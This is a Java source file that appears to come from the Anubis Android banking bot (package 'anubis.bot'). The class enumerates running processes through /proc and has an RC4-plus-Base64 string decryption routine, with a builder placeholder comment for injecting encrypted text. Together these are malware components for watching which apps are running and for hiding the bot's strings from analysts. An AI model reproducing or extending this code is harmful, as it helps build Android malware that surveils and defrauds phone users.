package anubis.bot.myapplication.API.ProcessesSDK6;

import android.os.Parcel;
import android.os.Parcelable;
import android.text.TextUtils;
import android.util.Base64;

import java.io.IOException;
import java.util.Locale;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.UtilsClass;

public class classProcAndroidProcess implements Parcelable {
  UtilsClass SF = new UtilsClass();

  public String str_decrypt(String textDE_C, String key)
  {
    UtilsClass utilsClass = new UtilsClass();
    try
    {
      byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
      textDE_C = new String(data, "UTF-8");
      byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
      ClassRC4 rcd = new ClassRC4(key.getBytes());
      return  new String(rcd.decrypt(detext));
    }catch (Exception ex){ }
    return "";
  }

  public final String name;
  public final int pid;

  //[@@@fuctionsCryptText@@@]
  //MINImusor1
  public classProcAndroidProcess(int pid) throws IOException {
    this.pid = pid;
    this.name = getProcessName(pid);
  }

  protected classProcAndroidProcess(Parcel in) {
    this.name = in.readString();
    this.pid = in.readInt();
  }

  public classProcCgroup cgroup() throws IOException {
    return classProcCgroup.get(pid);
  }

  public classProcStat stat() throws IOException {
    return classProcStat.get(pid);
  }
  public classProcSTATUS status() throws IOException {
    return classProcSTATUS.get(pid);
  }

  private String getProcessName(int pid) throws IOException {
    String cmdline = null;
    try {
      cmdline = classProcFile.readFile(String.format(Locale.ENGLISH, "/proc/%d/cmdline", pid)).trim();
    } catch (IOException ignored) {
    }
    if (TextUtils.isEmpty(cmdline)) {
      try {
        return classProcStat.get(pid).getComm();
      } catch (Exception e) {
        throw new IOException(String.format(Locale.ENGLISH, "Error reading /proc/%d/stat", pid));
      }
    }
    return cmdline;
  }

  @Override
  public int describeContents() {
    return 0;
  }

  @Override
  public void writeToParcel(Parcel dest, int flags) {
    dest.writeString(this.name);
    dest.writeInt(this.pid);
  }
  public static final Creator<classProcAndroidProcess> CREATOR = new Creator<classProcAndroidProcess>() {

    @Override
    public classProcAndroidProcess createFromParcel(Parcel source) {
      return new classProcAndroidProcess(source);
    }

    @Override
    public classProcAndroidProcess[] newArray(int SiS) {
      return new classProcAndroidProcess[SiS];
    }
  };
}
